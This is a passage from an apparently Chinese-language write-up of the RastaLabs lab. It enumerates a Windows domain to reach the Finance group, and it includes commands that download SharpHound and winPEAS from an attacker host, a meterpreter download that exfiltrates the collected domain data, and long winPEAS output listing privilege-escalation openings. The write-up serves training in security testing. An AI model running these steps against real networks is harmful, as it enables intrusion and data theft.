+ type \\fs01\finance\flag.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\fs01\finance\flag.txt:String) [Get-Content], UnauthorizedAccessExce 
   ption
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

我们没有权限读取，所以下一个目标是提权到finance组

### net group "Finance" /domain
```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> net group "Finance" /domain
The request will be processed at a domain controller for domain rastalabs.local.

Group name     Finance
Comment        

Members

-------------------------------------------------------------------------------
bowen                    
The command completed successfully.
```

### net user bowen /domain
```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> net user bowen /domain
The request will be processed at a domain controller for domain rastalabs.local.

User name                    bowen
Full Name                    Bradley Owen
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            23/10/2017 16:22:42
Password expires             Never
Password changeable          24/10/2017 16:22:42
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               \\fs01.rastalabs.local\home$\bowen
Last logon                   13/03/2026 17:13:13

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Finance              *Domain Users         
The command completed successfully.
```

### cmdkey /list
检查凭据缓存

```plain
PS Microsoft.PowerShell.Core\FileSystem::\\fs01.rastalabs.local\home$\tquinn\Desktop> cmdkey /list

Currently stored credentials:

* NONE *
```

### DC IP
```plain
ping rastalabs.local

Pinging rastalabs.local [10.10.120.1] with 32 bytes of data:
Reply from 10.10.120.1: bytes=32 time<1ms TTL=128
Reply from 10.10.120.1: bytes=32 time<1ms TTL=128
Reply from 10.10.120.1: bytes=32 time<1ms TTL=128
Reply from 10.10.120.1: bytes=32 time<1ms TTL=128

Ping statistics for 10.10.120.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

## Sharphound
```plain
Invoke-WebRequest http://10.10.16.2/SharpHound.exe -OutFile C:\Users\tquinn\SharpHound.exe
```

```plain
C:\Users\tquinn\SharpHound.exe -c All --zipfilename loot.zip
```

```plain
meterpreter > download C:\\Users\\tquinn\\20260313181812_loot.zip
[*] Downloading: C:\Users\tquinn\20260313181812_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260313181812_loot.zip
[*] Downloaded 36.62 KiB of 36.62 KiB (100.0%): C:\Users\tquinn\20260313181812_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260313181812_loot.zip
[*] Completed  : C:\Users\tquinn\20260313181812_loot.zip -> /home/kali/Desktop/htb/rastalabs/20260313181812_loot.zip
meterpreter > 
```

## winpeas
```plain
iwr http://10.10.16.2:443/winPEASx64.exe -OutFile winpeas.exe
```

```plain
.\winpeas.exe > winpeas.txt
```

```plain
PS C:\Users\tquinn> PS C:\Users\tquinn> type winpeas.txt
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help                                                                                 
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((                                                         
        (((((((((((((((((((((((((((((((((((((((((((                                                     
      ((((((((((((((**********/##########(((((((((((((                                                  
    ((((((((((((********************/#######(((((((((((                                                 
    ((((((((******************/@@@@@/****######((((((((((                                               
    ((((((********************@@@@@@@@@@/***,####((((((((((                                             
    (((((********************/@@@@@%@@@@/********##(((((((((                                            
    (((############*********/%@@@@@@@@@/************((((((((                                            
    ((##################(/******/@@@@@/***************((((((                                            
    ((#########################(/**********************(((((                                            
    ((##############################(/*****************(((((                                            
    ((###################################(/************(((((                                            
    ((#######################################(*********(((((                                            
    ((#######(,.***.,(###################(..***.*******(((((                                            
    ((#######*(#####((##################((######/(*****(((((                                            
    ((###################(/***********(##############()(((((                                            
    (((#####################/*******(################)((((((                                            
    ((((############################################)((((((                                             
    (((((##########################################)(((((((                                             
    ((((((########################################)(((((((                                              
    ((((((((####################################)((((((((                                               
    (((((((((#################################)(((((((((                                                
        ((((((((((##########################)(((((((((                                                  
              ((((((((((((((((((((((((((((((((((((((                                                    
                 ((((((((((((((((((((((((((((((                                                         

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                      
                                                                                                        
  WinPEAS-ng by @hacktricks_live                                                                        

       /---------------------------------------------------------------------------------\              
       |                             Do you like PEASS?                                  |              
       |---------------------------------------------------------------------------------|              
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |              
       |         Follow on Twitter         :     @hacktricks_live                        |              
       |         Respect on HTB            :     SirBroccoli                             |              
       |---------------------------------------------------------------------------------|              
       |                                 Thank you!                                      |              
       \---------------------------------------------------------------------------------/              
                                                                                                        
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html                                                                  
   Creating Dynamic lists, this could take a while, please wait...                                      
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


????????????????????????????????????? System Information ?????????????????????????????????????

???????????? Basic System Information
? Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits                            
    OS Name: Microsoft Windows 10 Pro
    OS Version: 10.0.19045 N/A Build 19045
    System Type: x64-based PC
    Hostname: ws06
    Domain Name: rastalabs.local
    ProductName: Windows 10 Pro
    EditionID: Professional
    ReleaseId: 2009
    BuildBranch: vb_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC+00:00) Dublin, Edinburgh, Lisbon, London
    IsVirtualMachine: True
    Current Time: 13/03/2026 18:30:14
    HighIntegrity: False
    PartOfDomain: True
    Hotfixes: KB5030649 (9/28/2023), KB5030841 (9/28/2023), KB4562830 (8/30/2021), KB5003791 (6/3/2022), KB5011048 (9/28/2023), KB5012170 (8/10/2022), KB5015684 (9/28/2023), KB5030211 (9/28/2023), KB5014032 (6/3/2022), KB5014035 (6/3/2022), KB5015895 (8/10/2022), KB5026879 (8/29/2023), KB5029709 (9/28/2023), KB5005260 (8/30/2021),                                                                                    


???????????? Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

???????????? System Last Shutdown Date/time (from Registry)
                                                                                                        
    Last Shutdown Date/time        :    13/03/2026 17:09:00

???????????? User Environment Variables
? Check for some passwords or keys in the env variables 
    COMPUTERNAME: WS06
    USERPROFILE: C:\Users\tquinn
    HOMEPATH: \
    LOCALAPPDATA: C:\Users\tquinn\AppData\Local
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;\\fs01.rastalabs.local\home$\tquinn\Documents\WindowsPowerShell\Modules;C:\Program Files (x86)\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Program Files\Internet Explorer;;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\tquinn\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 25
    LOGONSERVER: \\DC01
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: H:
    SystemRoot: C:\WINDOWS
    TEMP: C:\Users\tquinn\AppData\Local\Temp
    SESSIONNAME: Console
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    FPS_BROWSER_APP_PROFILE_STRING: Internet Explorer
    APPDATA: C:\Users\tquinn\AppData\Roaming
    PROCESSOR_REVISION: 0101
    USERNAME: tquinn
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    OneDrive: C:\Users\tquinn\OneDrive
    HOMESHARE: \\fs01.rastalabs.local\home$\tquinn
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: RLAB
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    ComSpec: C:\WINDOWS\system32\cmd.exe
    SystemDrive: C:
    FPS_BROWSER_USER_PROFILE_STRING: Default
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\tquinn\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\WINDOWS
    USERDOMAIN: RLAB
    PUBLIC: C:\Users\Public
    USERDNSDOMAIN: RASTALABS.LOCAL

???????????? System Environment Variables
? Check for some passwords or keys in the env variables 
    ComSpec: C:\WINDOWS\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\WINDOWS\TEMP
    TMP: C:\WINDOWS\TEMP
    USERNAME: SYSTEM
    windir: C:\WINDOWS
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 25
    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
    PROCESSOR_REVISION: 0101

???????????? Audit Settings
? Check what is being logged 
    Not Found

???????????? Audit Policy Settings - Classic & Advanced

???????????? WEF Settings
? Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

???????????? LAPS Settings
? If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: 1
    LAPS Admin Account Name: 
    LAPS Password Complexity: 3
    LAPS Password Length: 8
    LAPS Expiration Protection Enabled: 1

???????????? Wdigest
? If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest                                                  
    Wdigest is not enabled

???????????? LSA Protection
? If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection                                                                 
    LSA Protection is not enabled

???????????? Credentials Guard
? If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard                                             
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

???????????? Cached Creds
? If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials           
    cachedlogonscount is 10

???????????? Enumerating saved credentials in Registry (CurrentPass)

???????????? AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe

???????????? Windows Defender configuration

???????????? UAC Status
? If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss                                                                                     
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] LocalAccountTokenFilterPolicy set to 1.
      [+] Any local account can be used for lateral movement.                                           

???????????? PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

???????????? Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

???????????? PS default transcripts history
? Read the PS history inside these files (if any)

???????????? HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2048
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 0
    EnableNegotiate: 1
    MigrateProxy: 1
    ProxyEnable: 0
    LockDatabase: 133426370519522292
    SecureProtocolsUpdated: 1

???????????? HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

???????????? Drives Information
? Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 5 GB)(Permissions: Authenticated Users [Allow: AppendData/CreateDirectories])                                                                          
    H:\ (Type: Network)(Filesystem: NTFS)(Available space: 3 GB)(Permissions: tquinn [Allow: AllAccess])

???????????? Checking WSUS
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

???????????? Checking KrbRelayUp
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup                                                                                                   
  The system is inside a domain (RLAB) so it could be vulnerable.
? You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

???????????? Checking If Inside Container
? If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

???????????? Checking AlwaysInstallElevated
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated                                                                                        
    AlwaysInstallElevated isn't available

???????????? Enumerate LSA settings - auth packages included
                                                                                                        
    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       scecli
    Authentication Packages              :       msv1_0
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    LsaCfgFlagsDefault                   :       0
    LsaPid                               :       684
    ProductType                          :       6
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
    restrictremotesam                    :       O:BAG:BAD:(A;;RC;;;DU)
    SecureBoot                           :       1

???????????? Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                        

  NTLM Signing Settings                                                                                 
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                      
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                        

  NTLM Auditing and Restrictions                                                                        
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

???????????? Display Local Group Policy settings - local users/machine
   Type             :     machine
   Display Name     :     Local Group Policy
   Name             :     Local Group Policy
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{00000000-0000-0000-0000-000000000000}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\WINDOWS\System32\GroupPolicy\Machine
   Link             :     Local
   GPO Link         :     Local Machine
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     machine
   Display Name     :     DisablePasswordChange
   Name             :     {ADE93ABA-5FA2-4BBE-85AE-ED79744480D6}
   Extensions       :     [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
   File Sys Path    :     C:\WINDOWS\system32\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{ADE93ABA-5FA2-4BBE-85AE-ED79744480D6}\Machine
   Link             :     LDAP://DC=rastalabs,DC=local
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     machine
   Display Name     :     Windows Update
   Name             :     {314CD45A-DD92-4916-A7AC-F90BE00D104A}
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\WINDOWS\system32\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{314CD45A-DD92-4916-A7AC-F90BE00D104A}\Machine
   Link             :     LDAP://DC=rastalabs,DC=local
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     machine
   Display Name     :     Default Domain Policy
   Name             :     {31B2F340-016D-11D2-945F-00C04FB984F9}
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
   File Sys Path    :     C:\WINDOWS\system32\GroupPolicy\DataStore\0\sysvol\rastalabs.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
   Link             :     LDAP://DC=rastalabs,DC=local
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     machine
   Display Name     :     LAPS
   Name             :     {FC395C1F-E3BD-43B9-8F58-6DA55E69D3E9}
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{C6DC5466-785A-11D2-84D0-00C04FB169F7}{942A8E4F-A261-11D1-A760-00C04FB9603F}][{D76B9641-3288-4F75-942D-087DE603E3EA}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\WINDOWS\system32\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{FC395C1F-E3BD-43B9-8F58-6DA55E69D3E9}\Machine
   Link             :     LDAP://OU=Workstations,DC=rastalabs,DC=local
   GPO Link         :     Organizational Unit
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     machine
   Display Name     :     Workstation Config
   Name             :     {54B33964-81D3-4E70-9214-731969A9F251}
   Extensions       :     [{00000000-0000-0000-0000-000000000000}{9AD2BAFE-63B4-4883-A08C-C3C6196BCAFD}{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{29BBE2D5-DE47-4855-97D7-2745E166DC6D}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{B05566AC-FE9C-4368-BE01-7A4CBB6CBA11}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{91FBB303-0CD5-4055-BF42-E512A681B325}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{B087BE9D-ED37-454F-AF9C-04291E351182}{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}][{E62688F0-25FD-4C90-BFF5-F508B9D2E31F}{9AD2BAFE-63B4-4883-A08C-C3C6196BCAFD}]
   File Sys Path    :     C:\WINDOWS\system32\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{54B33964-81D3-4E70-9214-731969A9F251}\Machine
   Link             :     LDAP://OU=Workstations,DC=rastalabs,DC=local
   GPO Link         :     Organizational Unit
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     machine
   Display Name     :     Certificates
   Name             :     {AC0F1953-061E-4A30-B1CF-6BEC924DA54B}
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
   File Sys Path    :     C:\WINDOWS\system32\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{AC0F1953-061E-4A30-B1CF-6BEC924DA54B}\Machine
   Link             :     LDAP://OU=Workstations,DC=rastalabs,DC=local
   GPO Link         :     Organizational Unit
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     machine
   Display Name     :     Logon Restrictions
   Name             :     {9D5C7855-6317-4966-B35A-125162157603}
   Extensions       :     [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
   File Sys Path    :     C:\WINDOWS\system32\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{9D5C7855-6317-4966-B35A-125162157603}\Machine
   Link             :     LDAP://OU=WS06,OU=Workstations,DC=rastalabs,DC=local
   GPO Link         :     Organizational Unit
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     user
   Display Name     :     Folder Redirection
   Name             :     {5A3DF0DE-E9DE-4D98-AD6E-7982F24BD9BC}
   Extensions       :     [{25537BA6-77A8-11D2-9B6C-0000F8080861}{88E729D6-BDC1-11D1-BD2A-00C04FB9603F}]
   File Sys Path    :     \\rastalabs.local\SysVol\rastalabs.local\Policies\{5A3DF0DE-E9DE-4D98-AD6E-7982F24BD9BC}\User
   Link             :     LDAP://DC=rastalabs,DC=local
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================


???????????? Potential GPO abuse vectors (applied domain GPOs writable by current user)
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

???????????? Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



???????????? Enumerating Printers (WMI)
      Name:                    OneNote for Windows 10
      Status:                  Unknown
      Sddl:                    O:SYD:(A;CIIO;RC;;;CO)(A;OIIO;RPWPSDRCWDWO;;;CO)(A;;SWRC;;;AC)(A;CIIO;RC;;;AC)(A;OIIO;RPWPSDRCWDWO;;;AC)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;RC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-1396373213-2872852198-2033860859-2102)(A;;LCSWSDRCWDWO;;;S-1-5-21-1396373213-2872852198-2033860859-2102)(A;OIIO;RPWPSDRCWDWO;;;LS)(A;;LCSWSDRCWDWO;;;LS)(A;OIIO;RPWPSDRCWDWO;;;BA)(A;;LCSWSDRCWDWO;;;BA)
      Is default:              False
      Is network printer:      False

   =================================================================================================

      Name:                    Microsoft XPS Document Writer
      Status:                  Unknown
      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-2494600839-2512263147-1827803950-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2494600839-2512263147-1827803950-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              False
      Is network printer:      False

   =================================================================================================

      Name:                    Microsoft Print to PDF
      Status:                  Unknown
      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-2494600839-2512263147-1827803950-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2494600839-2512263147-1827803950-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              True
      Is network printer:      False

   =================================================================================================

      Name:                    Fax
      Status:                  Unknown
      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;S-1-5-21-2494600839-2512263147-1827803950-1000)(A;OIIO;RPWPSDRCWDWO;;;S-1-5-21-2494600839-2512263147-1827803950-1000)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWDTSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)(A;OIIO;GA;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;SWRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;CIIO;GX;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)
      Is default:              False
      Is network printer:      False

   =================================================================================================


???????????? Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [Allow: WriteData/CreateFiles]                                O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  SearchTextHarvester                                                                                                                                                         O:SYG:SYD:P(D;;FA;;;NU)(D;;FA;;;BG)(A;;FR;;;IU)(A;;FA;;;SY)(A;;FA;;;BA)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


???????????? Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23090.2008-0\MpOav.dll"

   =================================================================================================


???????????? Enumerating Sysmon configuration
      You must be an administrator to run this check

???????????? Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

???????????? Installed .NET versions
                                                                                                        
  CLR Versions
   4.0.30319

  .NET Versions                                                                                         
   4.8.09037

  .NET & AMSI (Anti-Malware Scan Interface) support                                                     
      .NET version supports AMSI     : True
      OS supports AMSI               : True
        [!] The highest .NET version is enrolled in AMSI!


????????????????????????????????????? Interesting Events information ?????????????????????????????????????                                                                                                      

???????????? Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials                                                                                      
                                                                                                        
      You must be an administrator to run this check

???????????? Printing Account Logon Events (4624) for the last 10 days.
                                                                                                        
      You must be an administrator to run this check

???????????? Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                        
      You must be an administrator to run this check

???????????? PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                        

???????????? Displaying Power off/on events for last 5 days
                                                                                                        
  13/03/2026 17:09:10     :  Startup
  13/03/2026 17:09:00     :  Shutdown
  13/03/2026 03:07:39     :  Startup


????????????????????????????????????? Users Information ?????????????????????????????????????

???????????? Users
? Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups                                              
  Current user: tquinn
  Current groups: Domain Users, Everyone, Users, Interactive, Console Logon, Authenticated Users, This Organization, Local, Human Resources, Authentication authority asserted identity
   =================================================================================================

    WS06\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-Expi-Req

    WS06\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    WS06\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
